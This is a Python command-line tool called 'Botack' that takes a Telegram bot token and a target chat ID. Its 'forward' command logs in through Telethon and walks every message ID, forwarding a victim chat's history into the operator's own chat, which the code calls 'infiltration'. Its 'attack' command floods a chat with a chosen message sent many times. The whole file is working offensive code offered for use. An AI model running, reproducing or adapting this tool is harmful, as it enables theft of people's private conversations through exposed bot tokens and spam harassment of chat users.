import argparse
import os
import sys
import requests
import asyncio
from telethon import TelegramClient
from dotenv import load_dotenv

banner = """

░█▀▀█ ░█▀▀▀█ ▀▀█▀▀ ─█▀▀█ ░█▀▀█ ░█─▄▀ 
░█▀▀▄ ░█──░█ ─░█── ░█▄▄█ ░█─── ░█▀▄─ 
░█▄▄█ ░█▄▄▄█ ─░█── ░█─░█ ░█▄▄█ ░█─░█
                      Bot Attack 1.0
"""

CYAN = "\033[1;36m"
GREEN = "\033[1;32m"
RED = "\033[1;31m"
RESET = "\033[0m"

INFO = f"{CYAN}[INFO]{RESET}"
SUCCESS = f"{GREEN}[SUCCESS]{RESET}"
ERROR = f"{RED}[ERROR]{RESET}"

# env
load_dotenv()
apiId = int(os.getenv("TELEGRAM_API_ID", "0"))
apiHash = os.getenv("TELEGRAM_API_HASH", "")
phoneNumber = os.getenv("TELEGRAM_PHONE", "")

client = TelegramClient("anonSession", apiId, apiHash)
telegramApiUrl = "https://api.telegram.org/bot"

class formatHelp(argparse.RawTextHelpFormatter):
    def format_help(self):
        return """\
Usage:
  botack [command]

Available Commands:
  forward     Forwards all messages from bot
  attack      Sends multiple message to bot

Flags:
  -t, --token string         Telegram bot token (required)
  -c, --chatId string        Target chat ID (required)
  -m, --message string       Message to send (required for attack)
  -l, --looping int          Number of messages to send (required for attack)
  -h, --help                 Show help information
"""

async def telethonSendStart(botUsername):
    await client.start(phoneNumber)
    print(f"{INFO} Successfully logged in as {phoneNumber}.")
    try:
        if not botUsername.startswith("@"):
            botUsername = "@" + botUsername
        await client.send_message(botUsername, "/start")
        print(f"{SUCCESS} Sent '/start' to {botUsername}.")
    except Exception as e:
        print(f"{ERROR} Failed to send '/start': {e}")
    finally:
        await client.disconnect()

def getMe(botToken):
    url = f"{telegramApiUrl}{botToken}/getMe"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("ok"):
            return data["result"]
        print(f"{ERROR} getMe failed: {data}")
    except Exception as e:
        print(f"{ERROR} getMe request failed: {e}")
    return None

def getUpdates(botToken):
    url = f"{telegramApiUrl}{botToken}/getUpdates"
    try:
        response = requests.get(url)
        data = response.json()
        if data.get("ok") and data["result"]:
            lastUpdate = data["result"][-1]
            chatId = lastUpdate["message"]["chat"]["id"]
            lastMessageId = lastUpdate["message"]["message_id"]
            print(f"{INFO} Bot User ID: {chatId}, Last Message ID: {lastMessageId}")
            return chatId, lastMessageId
    except Exception as e:
        print(f"{ERROR} Failed to retrieve updates: {e}")
    return None, None

def infiltrate(botToken, chatId):
    myChatId, lastMessageId = getUpdates(botToken)
    if not myChatId or not lastMessageId:
        print(f"{ERROR} Unable to retrieve the last message.")
        return

    print(f"{INFO} Initiating infiltration on chat ID {chatId}...")

    for msgId in range(lastMessageId, max(1, lastMessageId - 200), -1):
        url = f"{telegramApiUrl}{botToken}/forwardMessage"
        payload = {
            "chat_id": myChatId,
            "from_chat_id": chatId,
            "message_id": msgId
        }
        try:
            response = requests.post(url, json=payload)
            result = response.json()
            if result.get("ok"):
                print(f"{SUCCESS} Message {msgId} successfully infiltrated!")
                break
            else:
                print(f"{INFO} Trying message ID {msgId - 1}...")
        except Exception as e:
            print(f"{ERROR} Failed to forward message {msgId}: {e}")

def forwardAllMessages(botToken, fromChatId):
    myChatId, lastMessageId = getUpdates(botToken)
    if not myChatId or not lastMessageId:
        print(f"{ERROR} Failed to get bot user ID or last message ID.")
        return

    print(f"{INFO} Forwarding all messages from chat ID {fromChatId} to {myChatId}...")

    for msgId in range(1, lastMessageId + 1):
        url = f"{telegramApiUrl}{botToken}/forwardMessage"
        payload = {
            "chat_id": myChatId,
            "from_chat_id": fromChatId,
            "message_id": msgId
        }
        try:
            response = requests.post(url, json=payload)
            result = response.json()
            if result.get("ok"):
                print(f"{SUCCESS} Message {msgId} successfully forwarded!")
            else:
                print(f"{ERROR} Failed to forward message {msgId}: {result}")
        except Exception as e:
            print(f"{ERROR} Failed to forward message {msgId}: {e}")

def forwardProcess(botToken, chatId):
    print(f"{INFO} Starting the forwarding process...")

    botInfo = getMe(botToken)
    if not botInfo:
        print(f"{ERROR} Failed to retrieve bot information.")
        return
    
    botUsername = botInfo.get("username", "")
    if not botUsername:
        print(f"{ERROR} Could not find bot username!")
        return

    print(f"{INFO} Bot verified: @{botUsername}")

    asyncio.run(telethonSendStart(botUsername))
    infiltrate(botToken, chatId)
    forwardAllMessages(botToken, chatId)

def attack(botToken, chatId, message, looping):
    url = f"{telegramApiUrl}{botToken}/sendMessage"
    payload = {
        "chat_id": chatId,
        "text": message
    }

    print(f"{INFO} Starting attack on chat ID {chatId} with {looping} messages...")

    for i in range(looping):
        try:
            response = requests.post(url, json=payload)
            result = response.json()
            if result.get("ok"):
                print(f"{SUCCESS} Message {i+1}/{looping} sent successfully!")
            else:
                print(f"{ERROR} Failed to send message {i+1}/{looping}: {result}")
        except Exception as e:
            print(f"{ERROR} Failed to send message {i+1}/{looping}: {e}")

if __name__ == "__main__":
    print(banner)

    parser = argparse.ArgumentParser(
        description="CLI Bot Steal and Attack.",
        formatter_class=formatHelp,
        add_help=False
    )

    parser.add_argument("command", nargs="?", choices=["forward", "attack"], help="Available commands: forward, attack")
    parser.add_argument("-t", "--token", required=False, help="Telegram bot token")
    parser.add_argument("-c", "--chatId", required=False, help="Target chat ID")
    parser.add_argument("-m", "--message", help="Custom message to send (required for attack)")
    parser.add_argument("-l", "--looping", type=int, help="Number of messages to send (required for attack)")

    args = parser.parse_args()
    
    try:
        if not args.command:
            parser.print_help()
            sys.exit(1)

        if args.command == "forward":
            if not args.token or not args.chatId:
                print(f"{ERROR} The forward command requires --token (-t) and --chatId (-c).")
                sys.exit(1)
            print(f"{INFO} Forwarding process started for chat ID {args.chatId}...")
            forwardProcess(args.token, args.chatId)

        elif args.command == "attack":
            if not args.token or not args.chatId or not args.message or not args.looping:
                print(f"{ERROR} The attack command requires --token (-t), --chatId (-c), --message (-m), and --looping (-l).")
                sys.exit(1)
            print(f"{INFO} Attacking chat ID {args.chatId} with {args.looping} messages...")
            attack(args.token, args.chatId, args.message, args.looping)

    except KeyboardInterrupt:
        print(f"\n{ERROR} Process interrupted by user. Exiting...")
        sys.exit(0)
